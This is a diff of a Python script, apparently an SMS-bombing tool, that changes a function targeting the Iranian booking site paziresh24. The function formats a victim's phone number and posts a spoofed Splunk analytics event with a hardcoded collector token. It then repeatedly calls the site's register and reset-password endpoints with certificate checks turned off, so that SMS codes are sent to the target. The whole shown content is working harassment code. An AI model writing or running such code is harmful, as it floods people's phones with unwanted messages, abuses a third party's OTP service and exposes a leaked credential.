@@ -64,18 +64,22 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+
 def paziresh24(phone):
     try:
         session = requests.Session()
+
+        # فرمت کردن شماره موبایل
         formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        formatted_phone = f"0{formatted_phone}"
-        
-        # 1. ابتدا event load را ثبت می‌کنیم
+        if not formatted_phone.startswith("0"):
+            formatted_phone = f"0{formatted_phone}"
+
+        # ثبت رویداد اولیه در Splunk
         splunk_headers = {
             "Authorization": "Splunk cd46b97e-bf0d-46e4-ba7e-111c2f88291f",
             "Content-Type": "application/json",
         }
-        
+
         load_event = {
             "sourcetype": "_json",
             "event": {
@@ -88,12 +92,12 @@ def paziresh24(phone):
                     "host": "www.paziresh24.com"
                 },
                 "popupForm": True,
-                "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
+                "userAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X)",
                 "terminal_id": "clinic-68b0f1d69b0897.11243898",
                 "is_application": False
             }
         }
-        
+
         session.post(
             "https://gozargah-splunk.paziresh24.com/services/collector",
             json=load_event,
@@ -101,36 +105,47 @@ def paziresh24(phone):
             timeout=5,
             verify=False
         )
-        
-        # 2. سپس درخواست ثبت نام/لاگین را ارسال می‌کنیم
+
+        # هدرهای API
         api_headers = {
             "Accept": "application/json, text/plain, */*",
             "accept-timezone": "Asia/Tehran",
             "content-type": "application/json; charset=utf-8",
         }
-        
-        # اول reset password را امتحان می‌کنیم
-        reset_payload = {"mobile": formatted_phone}
-        response = session.post(
-            "https://apigw.paziresh24.com/gozargah/resetpassword",
-            json=reset_payload,
-            headers=api_headers,
-            timeout=10,
-            verify=False
-        )
-        
-        print(f'{y}[Debug] paziresh24 Status: {response.status_code}{a}')
-        
-        if response.status_code == 200:
-            print(f'{g}(paziresh24) request sent successfully!{a}')
-            return True
-        else:
-            print(f'{r}[-] paziresh24 error: {response.status_code}{a}')
-            return False
-            
+
+        # مسیرهای تست
+        endpoints = {
+            "register": "https://apigw.paziresh24.com/gozargah/register",
+            "resetpassword": "https://apigw.paziresh24.com/gozargah/resetpassword"
+        }
+
+        for name, url in endpoints.items():
+            payload = {"mobile": formatted_phone}
+            response = session.post(
+                url,
+                json=payload,
+                headers=api_headers,
+                timeout=10,
+                verify=False
+            )
+
+            print(f"[{name}] Status Code: {response.status_code}")
+            try:
+                data = response.json()
+                print(f"[{name}] Response: {data}")
+                if data.get("code") == 0:
+                    print(f"[{name}] پیامک با موفقیت ارسال شد ✅")
+                else:
+                    print(f"[{name}] ارسال پیامک ناموفق ❌")
+            except Exception as e:
+                print(f"[{name}] خطا در خواندن پاسخ: {e}")
+
+        return True
+
     except Exception as e:
-        print(f'{r}[!] paziresh24 exception: {e}{a}')
+        print(f"[!] خطای کلی: {e}")
         return False
+
         
         
 
